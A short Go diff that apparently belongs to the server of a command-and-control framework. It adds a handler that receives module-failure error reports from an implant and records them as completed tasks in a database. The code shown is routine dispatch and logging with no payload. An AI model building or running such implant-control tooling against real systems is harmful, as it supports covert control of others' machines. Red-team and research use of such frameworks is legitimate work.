@@ -17,6 +17,7 @@ import (
 var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
 	0: handleImplantRegister,
 	1: handleCheckin,
+	4: handleImplantErrorResp,
 	//reserved for implant functionality
 	12: handleFileInfoResp,
 }
@@ -106,6 +107,23 @@ func handleCheckin(sess *transport.Session, data interface{}) {
 	}
 
 	transport.SendEnvelopeToImplant(sess, 2, req)
+}
+
+// Handles enveloped with messageType==4. The implant send this message when execution of a module fails.
+func handleImplantErrorResp(sess *transport.Session, data interface{}) {
+	implantErrorResp, ok := data.(*communication.ImplantErrorResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=4 (ImplantErrorResp), but could not convert envelope data to ImplantErrorResp datastructure")
+		return
+	}
+	marshalledRes, err := json.Marshal(implantErrorResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantErrorResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(implantErrorResp.TaskId, marshalledRes)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", implantErrorResp.TaskId, err.Error())
+	}
 }
 
 // Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
